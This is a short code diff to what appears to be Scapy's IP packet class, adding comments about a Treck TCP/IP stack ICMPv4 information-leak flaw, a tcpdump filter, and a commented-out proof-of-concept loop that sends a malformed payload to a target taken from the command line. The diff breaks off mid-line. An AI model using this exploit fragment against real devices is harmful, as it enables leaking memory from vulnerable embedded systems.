@@ -614,10 +614,17 @@ class IP(Packet, IPTools):
     #The Treck TCP/IP stack before 6.0.1.66 improperly handles an IPv4/ICMPv4 Length Parameter Inconsistency, 
     #which might allow remote attackers to trigger an information leak. 
     
+    #ICMP filter for tcpdump: 
+    #tcpdump ip proto \\icmp 
+    
     ##! /usr/bin/env python3
     #from scapy.all import *
-    #    while True:
-    #        target="127.0.0.1"
+    #
+    #targettt = sys.argv[1]
+    #print (targettt)
+    #
+    #while True:
+    #       target=targettt
     #
     #        innerPayload = "\x00"*40 + "\x41"*100 # as described in JSOF's whitepaper 
     #        innerPayload = "\x00"*40 + "\x41"*1
